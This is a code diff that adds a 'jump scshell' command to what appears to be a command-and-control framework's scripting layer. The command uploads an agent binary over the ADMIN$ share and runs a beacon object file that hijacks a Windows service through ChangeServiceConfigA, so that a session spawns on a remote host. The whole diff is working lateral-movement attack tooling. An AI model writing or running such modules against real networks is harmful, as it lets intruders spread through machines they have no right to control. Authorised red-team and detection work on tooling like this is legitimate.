@@ -35,6 +35,31 @@ cmd_jump.addSubCommands([_cmd_jump_psexec]);
 
 
 
+var _cmd_jump_scshell = ax.create_command("scshell", "Attempt to spawn a session on a remote target via ChangeServiceConfigA", "jump scshell 192.168.0.1 /tmp/agent_svc.exe -b detectme.exe -n defragsvc -s ADMIN$ -p C:\\Windows");
+_cmd_jump_scshell.addArgString("target", true);
+_cmd_jump_scshell.addArgFile("binary", true);
+_cmd_jump_scshell.addArgFlagString( "-b", "bin_name", "Binary name", "detectme.exe");
+_cmd_jump_scshell.addArgFlagString( "-n", "svc_name", "Target Service name", "defragsvc");
+_cmd_jump_scshell.addArgFlagString( "-s", "share", "Share for uploading the file", "ADMIN$");
+_cmd_jump_scshell.addArgFlagString( "-p", "upload_path", "Path to the payload file (depend on share)", "C:\\Windows");
+_cmd_jump_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let target          = parsed_json["target"];
+    let binary_content  = parsed_json["binary"];
+    let svc_name        = parsed_json["svc_name"];
+    let upload_path     = parsed_json["upload_path"];
+    let share           = parsed_json["share"];
+    let bin_name        = parsed_json["bin_name"];
+
+    let bof_params = ax.bof_pack("cstr,bytes,cstr,cstr,cstr,cstr", [target, binary_content, svc_name, upload_path, share, bin_name]);
+    let bof_path = ax.script_dir() + "_bin/scshell." + ax.arch(id) + ".o";
+    let message = `Task: Jump to ${target} via ChangeServiceConfigA`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+cmd_jump.addSubCommands([_cmd_jump_scshell]);
+
+
+
 var _cmd_invoke_winrm = ax.create_command("winrm", "Use WinRM to execute commands on other systems", "invoke winrm 192.168.0.1 whoami /all");
 _cmd_invoke_winrm.addArgString("target", true);
 _cmd_invoke_winrm.addArgString("cmd", true);
